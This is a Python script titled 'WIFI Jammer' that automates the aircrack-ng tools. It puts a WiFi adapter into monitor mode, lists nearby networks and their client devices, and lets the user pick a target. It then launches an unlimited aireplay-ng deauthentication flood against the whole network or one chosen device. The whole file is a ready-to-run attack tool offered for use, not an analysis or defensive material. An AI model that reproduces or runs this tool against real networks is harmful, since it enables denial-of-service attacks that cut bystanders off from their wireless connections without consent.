from prettytable import PrettyTable
import subprocess
import re
import os
import sys
print("""
__        _____ _____ ___       _                                     
\ \      / /_ _|  ___|_ _|     | | __ _ _ __ ___  _ __ ___   ___ _ __ 
 \ \ /\ / / | || |_   | |   _  | |/ _` | '_ ` _ \| '_ ` _ \ / _ \ '__|
  \ V  V /  | ||  _|  | |  | |_| | (_| | | | | | | | | | | |  __/ |   
   \_/\_/  |___|_|   |___|  \___/ \__,_|_| |_| |_|_| |_| |_|\___|_|  
""")
if not os.geteuid() == 0:
    sys.exit("\033[1;91m\n[!] Script must be run as root. ¯\_(ツ)_/¯\033[1;m")


def start_monitor_mode(interface):
    proc = subprocess.run(["airmon-ng", "start", interface],
                          stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    wlanmon = re.findall(r"monitor mode vif enabled.+", proc.stdout, re.M)
    if len(wlanmon) == 0:
        sys.exit(
            f"\033[1;91mAn error happened while setting {interface} in monitor mode. Try again!!\033[1;m")
    wlanmon = wlanmon[0].rsplit(']', 1)[1].replace(')', '')
    print(f"\033[1;92m[+] Monitor mode enabled : {wlanmon}\033[1;m")
    return wlanmon


def stop_monitor_mode(wlanmon):
    proc = subprocess.run(["airmon-ng", "stop", wlanmon],
                          stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    wlan = re.findall(r"station mode vif enabled.+", proc.stdout, re.M)
    if len(wlan) == 0:
        sys.exit("\033[1;92m[!] An error happened!!\033[1;m")
    wlan = wlan[0].rsplit(']', 1)[1].replace(')', '')
    print(f"\033[1;92m[+] Managed mode enabled : {wlan}\033[1;m")
    return wlan


proc = subprocess.run(["airmon-ng"], stdout=subprocess.PIPE,
                      stderr=subprocess.STDOUT, text=True)
interfaces = re.findall(r"^phy[0-9].+", proc.stdout, re.M)
for iter, phy in enumerate(interfaces, 1):
    interface = phy.split('\t')[1]
    chipset = phy.split('\t')[-1]
    print(f"\033[1;92m{iter} - {interface} [{chipset}]\033[1;m")
if len(interfaces) == 0:
    sys.exit(
        "\033[1;91m[!] There is no interface. Please connect a WiFi Adapter and try again!\033[1;m")
choice = int(
    input(f"\033[1;96mSelect an interface [1-{len(interfaces)}] : \033[1;m"))
interface = interfaces[choice-1].split("\t")[1]
wlanmon = start_monitor_mode(interface)
proc = subprocess.Popen(["airodump-ng", wlanmon],
                        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
networks = {}
try:
    table = PrettyTable(['ESSID', 'Channel', 'BSSID'])
    for i in proc.stdout:
        output = re.findall(
            "^(?:\\x1b\[0K\\x1b\[1B)?\s?(?:[0-9A-Fa-f]{2}[:]?){6}\s+[-]?[0-9]+\s.+", i.strip(), re.M)
        if output:
            line = output[0].split()
            line.remove("\x1b[0K") if "\x1b[0K" in line else None
            line.remove("\x1b[0K\x1b[1B") if "\x1b[0K\x1b[1B" in line else None
            if line[0] not in networks:
                os.system("clear")
                print(
                    "\033[1;92m\n[+] Scanning... Press Ctrl+C to stop scanning networks\033[1;m")
                if "<length:" not in line:
                    networks[line[0]] = [line[0], line[5], " ".join(line[10:])]
                    table.add_row([line[0], line[5], " ".join(line[10:])])
                else:
                    networks[line[0]] = [line[0], line[5], " ".join(line[-2:])]
                    table.add_row([line[0], line[5], " ".join(line[-2:])])
                print(table)
                print(f"\033[1;92m{len(networks)} Networks found.\033[1;m")
except KeyboardInterrupt:
    os.system("clear")
    if len(networks) == 0:
        exit("\033[1;91m[!] No networks available. Try again!!\033[1;m")
    table = PrettyTable(['N°', 'ESSID', 'Channel', 'BSSID'])
    for iter, (key, value) in enumerate(networks.items(), 1):
        table.add_row([iter, value[2], value[1], value[0]])
    print(table)
    while True:
        try:
            choices = int(
                input(f"\033[1;96m\n[+] Select network you to attack [1-{len(networks)}] : \033[1;m"))
            target_network = networks[list(networks)[choices-1]]
            break
        except (IndexError, ValueError):
            print("\033[1;91m[!] Wrong choice. Try again!!\033[1;m")
    devices = []
    while True:
        try:
            os.system("clear")
            print(
                f"\033[1;92m1 - Deauth all devices in {target_network[2]}\033[1;m")
            print(
                f"\033[1;92m2 - Deauth target device in {target_network[2]}\033[1;m")
            choice = int(input("\033[1;96m\n[+] Select one : \033[1;m"))
            if choice == 1:
                proc = subprocess.run(["airmon-ng", "start", wlanmon, target_network[1]],
                                      stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                try:
                    print(
                        "\033[1;92m\nPress Ctrl+C to stop deauth authentication\033[1;m")
                    proc = subprocess.run(
                        ["aireplay-ng", "--deauth", "0", "-a", target_network[0], wlanmon])
                except KeyboardInterrupt:
                    break
            elif choice == 2:
                proc = subprocess.Popen(["airodump-ng", "--bssid", target_network[0], "--channel",
                                        target_network[1], wlanmon], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                try:
                    table = PrettyTable(['Station (MAC Device)'])
                    x = []
                    for i in proc.stdout:
                        output = re.findall(
                            "^(?:\\x1b\[0K\\x1b\[1B)?\s?(?:[0-9A-Fa-f]{2}[:]?){6}\s+(?:[0-9A-Fa-f]{2}[:]?){6}", i.strip())
                        if output:
                            line = output[0].split()
                            line.remove(
                                "\x1b[0K\x1b[1B") if "\x1b[0K\x1b[1B" in line else None
                            if line[1] not in devices:
                                devices.append(line[1])
                                os.system("clear")
                                print(
                                    "\033[1;92m\n[+] Scanning devices... Press Ctrl+C to stop scanning devices\033[1;m")
                                table.add_row([line[1]])
                                print(table)
                except KeyboardInterrupt:
                    os.system("clear")
                    if len(devices) == 0:
                        wlan = stop_monitor_mode(wlanmon)
                        exit(
                            "\033[1;91m[!] No devices available. Try again!!\033[1;m")
                    table = PrettyTable(['N°', 'Station (MAC Device)'])
                    for iter, value in enumerate(devices, 1):
                        table.add_row([iter, value])
                    print(table)
                    while True:
                        try:
                            choices = int(
                                input(f"\033[1;96m\n[+] Select device you to attack [1-{len(devices)}] : \033[1;m"))
                            target_device = devices[choices-1]
                            break
                        except (IndexError, ValueError):
                            print(
                                "\033[1;91m[!] Wrong choice. Try again!!\033[1;m")
                    try:
                        subprocess.run(["aireplay-ng", "--deauth", "0", "-a",
                                       target_network[0], "-c", target_device, wlanmon])
                    except KeyboardInterrupt:
                        break
                    break
        except (IndexError, ValueError):
            print("\033[1;91m[!] Wrong choice. Try again!!\033[1;m")
    wlan = stop_monitor_mode(wlanmon)
